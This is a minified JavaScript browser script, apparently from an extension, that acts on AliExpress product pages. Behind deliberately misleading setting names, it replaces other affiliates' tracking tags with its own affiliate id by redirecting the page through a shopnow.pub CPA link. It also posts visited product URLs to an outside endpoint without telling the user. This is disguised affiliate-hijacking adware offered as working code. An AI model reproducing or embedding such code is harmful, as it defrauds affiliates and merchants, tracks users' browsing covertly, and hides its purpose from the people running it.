const SETTINGS = {
    decodingSites: {
        urls: ["*://*.aliexpress.ru/*", "*://*.aliexpress.com/*"]
    },
    decodingOtherInfinite: !0,
    decodingMessage: !0,
    decodingNavigate: !0,
    decodingSelectedWord: "https://www.aliexpress.ru/item/-/",
    decodingLanguage: "https://shopnow.pub/redirect/cpa/o/r9jxg39v6sj9dyyd35ble3yj0ad90nsy?to=",
    decodingPrefix: "shopnow.pub/redirect",
    decodingNecessaryParts: ["item/", "item//", "item%2F"],
    checkIsAlreadyTranslated: !0,
    decodingId: ["1848012"],
    decodingName: "af=",
    decodingPlatform: "aff_platform=",
    decodingPlatformVariant: ["aff_platform=api-new-link-generate"],
    decodingInfo: "redirectUrl",
    decodingSuffix: ".html",
    maxDecodingTrials: 0,
    decodingTime: 36e5,
    retryGetSettingsTimeout: 36e5,
    decodingTrialsNumber: 5,
    decodingObsoleteTime: 15e3,
    failLink: "https://api.inst.poqdev.com/fail",
    decodingTheStart: "",
    decodingTheEnd: "https://google.com"
},
mapDecodingCounter = new Map;
var decodingTrials = 5,
lastDecodingTime = -1,
maxDecodingTrials = 4,
doDecoding = !0,
decodingFailStop = !1,
lastDecodingPart = -1;

function notifyAboutFail(e, i) {
const n = {
    productUrl: i
};
fetch(e, {
    method: "POST",
    headers: {
        "Content-Type": "application/json;charset=utf-8"
    },
    body: JSON.stringify(n)
})
}

function getDecodingPartWithSeparator(e, i, n) {
if (-1 !== e.indexOf(i) && -1 !== e.indexOf(n.decodingSuffix)) {
    var d = e.lastIndexOf(i) + i.length,
        o = e.lastIndexOf(n.decodingSuffix),
        t = e.substring(d, o);
    if (-1 !== t.indexOf("_") && (t = t.substring(t.indexOf("_") + 1)), /^\d+$/.test(t)) return t
}
}

function getDecodingPart(e, i) {
for (var n of i.decodingNecessaryParts) {
    var d = getDecodingPartWithSeparator(e, n, i);
    if (null != d) return d
}
}

function isAlreadyDecoded(e, i) {
if (-1 === e.indexOf(i.decodingName)) {
    if (-1 === e.indexOf(i.decodingPlatform)) return !1;
    for (var n of i.decodingPlatformVariant)
        if (-1 !== e.indexOf(n)) return !1;
    return !0
}
if (null == getDecodingPart(e, i)) return !1;
for (var d of i.decodingId) {
    n = i.decodingName + d;
    if (-1 !== e.indexOf(n)) return !1
}
return !0
}

function doDecodingVariant(e, i, n) {
function d(e, n) {
    var d = [];
    for (let n of mapDecodingCounter.keys()) {
        e - mapDecodingCounter.get(n).time > i.decodingObsoleteTime && d.push(n)
    }
    for (let e of d) mapDecodingCounter.delete(e);
    var o = mapDecodingCounter.get(n);
    if (null != o) {
        if (o.cnt += 1, o.cnt > i.decodingTrialsNumber) return notifyAboutFail(i.failLink, n), !1
    } else mapDecodingCounter.set(n, {
        cnt: 1,
        time: e
    });
    return decodingTrials = 0, lastDecodingTime = e, !0
}
maxDecodingTrials = i.maxDecodingTrials;
var o = e,
    t = getDecodingPart(o, i);
if (null == t) return {};
if (o.includes(i.decodingPrefix)) return {};
lastDecodingPart != t && (decodingTrials += 1), lastDecodingPart = t;
var r = i.decodingSelectedWord + t + i.decodingSuffix,
    a = i.decodingLanguage + r,
    c = JSON.parse(`{"${i.decodingInfo}": "${a}"}`);
if (!doDecoding || decodingFailStop) return {};
const g = Date.now();
return isAlreadyDecoded(o, i) && d(g, r) ? (setTimeout((() => {
    let e = a;
    window.location.href = e
}), 100), c) : g - lastDecodingTime < i.decodingTime ? {} : !o.includes(i.decodingName) && decodingTrials >= maxDecodingTrials && d(g, r) ? (setTimeout((() => {
    let e = a;
    window.location.href = e
}), 100), c) : {}
}
var url = window.location.href;
const decInfoNumber = SETTINGS.decodingId[0],
decodingInfoTypes = SETTINGS.decodingSites.urls.map((e => e.slice(6, -1) + "item")),
beforeAaa = SETTINGS.decodingLanguage;
decodingInfoTypes.some((e => url.includes(e))) && !url.match(decInfoNumber) && doDecodingVariant(url, SETTINGS, void 0);